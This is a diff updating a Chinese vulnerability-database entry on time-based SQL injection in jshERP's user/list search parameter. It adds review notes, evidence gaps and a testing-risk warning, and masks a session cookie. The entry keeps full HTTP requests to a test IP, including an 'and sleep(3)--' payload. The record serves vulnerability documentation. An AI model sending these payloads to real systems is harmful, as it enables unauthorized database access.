@@ -1,10 +1,50 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "华夏/jshERP user/list search SQL 注入"
+product: "华夏/jshERP"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "无tag/commit，MyBatis动态拼接"
+prerequisites: "示例登录Cookie"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/o-lmJHCaCiEqfdG1e_L3Lg"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%8D%8E%E5%A4%8FERP/%E5%8D%8E%E5%A4%8F%20ERP%20%E5%AD%98%E5%9C%A8%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
+id: "vw-21026cd347bcdfe09d356332"
+entity_id: "ve-21026cd347bcdfe09d356332"
+schema_version: "1"
 ---
 
-# 华夏 ERP 存在 SQL 注入漏洞
+# 华夏/jshERP user/list search SQL 注入
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：华夏/jshERP；user/list search SQLi
+- 版本、配置及部署条件：无tag/commit，MyBatis动态拼接
+- 认证与权限前提：示例登录Cookie
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 源码来源网盘无版本，调用链图未视检；${}与参数绑定根因清楚但应补代码文本
+- currentPage被HTML实体转坏为¤tPage，HTTP需修
+- 测试公有IP/账号/会话应惰性占位，靶场说明不等当前许可
+- 缺修复build/最小角色
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/o-lmJHCaCiEqfdG1e_L3Lg)
 
 测试靶场
@@ -79,7 +119,7 @@ src/main/resources/mapper_xml/UserMapperEx.xml
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8Y53Qlmw7z2fyWv54iaeVETYmGZZH0CibGqWDRYxaiclhkuqLqnjuXFsHZg/640?wx_fmt=png)
 
-```
+```http
 GET /user/list?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22q%22%2C%22offset%22%3A%221%22%2C%22rows%22%3A%221%22%7D¤tPage=1&pageSize=10&t=1615274773529 HTTP/1.1
 Host: 47.116.69.14
 User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
@@ -89,14 +129,14 @@ Accept-Encoding: gzip, deflate
 X-Requested-With: XMLHttpRequest
 Connection: close
 Referer: http://47.116.69.14/pages/manage/user.html
-Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274745; JSESSIONID=C5EBD91E0E68081AA25F206F2FECAC82; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274770
+Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274745; JSESSIONID=C******************************2; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274770
 ```
 
 使用 sleep 延时注入
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8YM6rH6hNlXBzGibnH7giaXQ2iblT35Yibl8vJOxVJJ0y4FM3M8t53xY4c4g/640?wx_fmt=png)
 
-```
+```http
 GET /user/list?search=%7B%22userName%22%3A%22'and+sleep(3)--%22%2C%22loginName%22%3A%22q%22%2C%22offset%22%3A%221%22%2C%22rows%22%3A%221%22%7D¤tPage=1&pageSize=10&t=1615274773529 HTTP/1.1
 Host: 47.116.69.14
 User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
@@ -106,7 +146,7 @@ Accept-Encoding: gzip, deflate
 X-Requested-With: XMLHttpRequest
 Connection: close
 Referer: http://47.116.69.14/pages/manage/user.html
-Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274745; JSESSIONID=C5EBD91E0E68081AA25F206F2FECAC82; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274770
+Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274745; JSESSIONID=C******************************2; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274770
 ```
 
 3、漏洞代码
